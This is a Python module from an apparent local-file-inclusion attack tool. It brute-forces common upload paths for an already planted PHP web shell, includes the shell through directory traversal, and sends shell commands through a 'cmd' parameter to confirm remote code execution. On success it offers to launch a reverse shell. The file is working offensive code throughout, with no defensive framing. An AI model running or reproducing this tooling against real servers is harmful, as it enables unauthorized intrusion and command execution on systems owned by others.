#!/usr/bin/env python3
"""
Mode 4: Uploaded File Trigger
Assumes a malicious PHP file is already uploaded; uses LFI to include & execute.
Supports single path or brute‑force wordlist.
"""

import os
import urllib.parse
from urllib.parse import quote_plus

# ---------- COMMON UPLOAD DIRECTORY + FILENAME WORDLIST ----------
UPLOAD_WORDLIST = [
    'uploads/shell.php',
    'uploads/cmd.php',
    'uploads/backdoor.php',
    'uploads/rce.php',
    'uploads/revshell.php',
    'uploads/webshell.php',
    'images/shell.php',
    'images/cmd.php',
    'images/backdoor.php',
    'images/rce.php',
    'files/shell.php',
    'files/cmd.php',
    'files/backdoor.php',
    'user_uploads/shell.php',
    'user_uploads/cmd.php',
    'avatars/shell.php',
    'profile_pics/shell.php',
    'tmp/shell.php',
    'temp/shell.php',
    'upload/shell.php',
    'uploadfiles/shell.php',
    'media/shell.php',
    'public/uploads/shell.php',
    'private/uploads/shell.php',
    'assets/uploads/shell.php',
    'content/uploads/shell.php',
]

def _test_inclusion(path, config, fuzzer, test_cmd=None):
    """Attempt LFI inclusion and test command execution."""
    if test_cmd is None:
        test_cmd = "id" if fuzzer.config['os_type'] == 'linux' else "whoami"
    
    lfi_payload = config['traversal_prefix'] + path.lstrip('/')
    encoded = fuzzer.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
    
    if config['lfi_type'] == 'path':
        test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        test_url += f"?cmd={quote_plus(test_cmd)}"
    else:
        base = fuzzer._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
        if '?' in base:
            test_url = base + f"&cmd={quote_plus(test_cmd)}"
        else:
            test_url = base + f"?cmd={quote_plus(test_cmd)}"
    
    status, content = fuzzer.send_http_request(
        config['protocol'], config['host'], config['port'],
        test_url, verbose=config['verbose']
    )
    if status == 200 and content and ('uid=' in content or test_cmd in content):
        return True, content
    return False, content

def run(config, fuzzer):
    fuzzer._print("\n" + "=" * 60, 'highlight')
    fuzzer._print("[*] MODE 4: UPLOADED FILE TRIGGER", 'highlight')
    fuzzer._print("=" * 60, 'highlight')
    fuzzer._print("[*] This mode assumes you have already uploaded a PHP shell.", 'info')
    fuzzer._print("[*] The shell should accept commands via '?cmd=' parameter.\n", 'info')
    
    choice = input("Enter path to uploaded file (relative to web root), or 'brute' to try common locations: ").strip()
    
    paths_to_try = []
    if choice.lower() == 'brute':
        paths_to_try = UPLOAD_WORDLIST
        fuzzer._print(f"[*] Brute‑forcing {len(paths_to_try)} common upload paths...", 'info')
    else:
        paths_to_try = [choice.lstrip('/')]
    
    test_cmd = input("Test command to verify RCE (default: id/whoami): ").strip()
    if not test_cmd:
        test_cmd = "id" if fuzzer.config['os_type'] == 'linux' else "whoami"
    
    found = False
    for path in paths_to_try:
        fuzzer._print(f"[*] Trying {path} ...", 'info')
        success, output = _test_inclusion(path, config, fuzzer, test_cmd)
        if success:
            fuzzer._print(f"[+] SUCCESS! Shell executed at {path}", 'success')
            fuzzer._print(f"[+] Command output:\n{output.strip()}", 'info')
            found = True
            # Save artifact
            fuzzer.save_artifact("uploaded_shell", path, output, 200)
            # Offer reverse shell
            rev = input("\nAttempt reverse shell? (y/N): ").strip().lower()
            if rev == 'y':
                fuzzer._attempt_reverse_shell(config, path)
            break
    
    if not found:
        fuzzer._print("[-] No working shell found. Check your path or try brute‑force.", 'error')
